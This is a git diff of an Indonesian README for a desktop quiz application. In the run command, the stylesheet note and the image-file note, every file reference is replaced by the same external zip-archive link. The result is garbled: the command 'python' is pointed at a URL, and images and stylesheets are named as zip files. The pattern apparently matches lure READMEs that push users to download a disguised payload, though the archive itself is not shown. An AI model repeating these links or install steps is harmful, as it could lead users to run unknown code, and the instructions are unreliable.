@@ -61,11 +61,11 @@ Aplikasi ini adalah aplikasi kuis berbasis desktop yang dikembangkan menggunakan
 
 3. **Jalankan Aplikasi**:
    ```bash
-   python https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip
+   python https://github.com/boybands/Quiz-Edukasi/raw/refs/heads/main/mazopathia/Edukasi_Quiz_v2.7-beta.1.zip
    ```
 
 4. **Opsional: Tambahkan StyleSheet**:
-   Tambahkan file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip` untuk menyesuaikan tampilan aplikasi.
+   Tambahkan file `https://github.com/boybands/Quiz-Edukasi/raw/refs/heads/main/mazopathia/Edukasi_Quiz_v2.7-beta.1.zip` untuk menyesuaikan tampilan aplikasi.
 
 ## Penggunaan
 
@@ -87,8 +87,8 @@ Aplikasi ini adalah aplikasi kuis berbasis desktop yang dikembangkan menggunakan
 
 ## Catatan
 
-- Pastikan file gambar yang digunakan (`https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, dll.) tersedia di direktori yang sama.
-- StyleSheet dapat disesuaikan melalui file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`.
+- Pastikan file gambar yang digunakan (`https://github.com/boybands/Quiz-Edukasi/raw/refs/heads/main/mazopathia/Edukasi_Quiz_v2.7-beta.1.zip`, `https://github.com/boybands/Quiz-Edukasi/raw/refs/heads/main/mazopathia/Edukasi_Quiz_v2.7-beta.1.zip`, dll.) tersedia di direktori yang sama.
+- StyleSheet dapat disesuaikan melalui file `https://github.com/boybands/Quiz-Edukasi/raw/refs/heads/main/mazopathia/Edukasi_Quiz_v2.7-beta.1.zip`.
 
 
 ## Selamat menggunakan aplikasi kuis ini!
